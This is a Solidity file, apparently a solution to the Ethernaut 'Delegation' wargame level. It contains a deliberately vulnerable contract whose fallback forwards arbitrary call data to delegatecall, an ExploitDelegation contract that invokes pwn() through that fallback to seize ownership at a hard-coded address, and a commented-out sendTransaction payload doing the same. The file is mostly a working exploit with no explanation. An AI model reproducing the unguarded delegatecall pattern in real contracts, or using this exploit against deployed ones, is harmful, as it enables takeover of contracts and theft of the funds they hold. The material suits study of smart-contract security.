pragma solidity ^0.4.18;

contract Delegate {

  address public owner;

  function Delegate(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  function Delegation(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  function() public {
    if(delegate.delegatecall(msg.data)) {
      this;
    }
  }
}

contract ExploitDelegation {
    Delegation delegation;
    
    function findDelegationContract() public {
        delegation = Delegation(0x21B9f93cc496b9782D44f5d84b7f9E7d6711e44D);
    }
    
    //It's recommended to use inline assembly instead of call()
    //https://github.com/ethereum/solidity/issues/2884#issuecomment-329169020
    function exploitDelegationContract() public {
        delegation.call(bytes4(keccak256("pwn()")));
    }
}


/* 
await contract.sendTransaction({
  to: "0x715e4E170086Cf23aA5F13D9b158eAf83e689640",
  data: "0xdd365b8b0000000000000000000000000000000000000000000000000000000000000000"
});
*/